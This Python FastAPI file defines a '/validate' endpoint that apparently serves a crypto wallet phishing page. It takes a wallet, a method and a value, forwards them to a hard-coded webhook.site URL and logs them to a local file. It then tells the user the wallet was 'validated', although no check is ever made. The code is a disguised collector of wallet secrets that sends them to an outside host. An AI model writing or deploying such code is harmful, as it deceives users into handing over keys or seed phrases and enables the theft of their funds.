from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
import json

app = FastAPI()

# ✅ Allow frontend to access backend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Change to your frontend URL in production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ✅ Define expected validation schema
class ValidationData(BaseModel):
    wallet: str
    method: str
    value: str

@app.post("/validate")
async def validate_wallet(data: ValidationData):
    # ✅ Forward to webhook
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://webhook.site/2920d0a0-1182-4b6a-a7af-921312c87c55",  # Replace if needed
                json=data.dict()
            )
        print("✅ Data forwarded to webhook.")
    except Exception as e:
        print("❌ Webhook forwarding failed:", e)

    # ✅ Log to file
    try:
        with open("submissions.txt", "a") as f:
            f.write(json.dumps(data.dict()) + "\n")
        print("📝 Data logged.")
    except Exception as e:
        print("⚠️ File logging failed:", e)

    # ✅ Success response
    return {
        "status": "success",
        "message": f"Wallet '{data.wallet}' validated via {data.method}."
    }
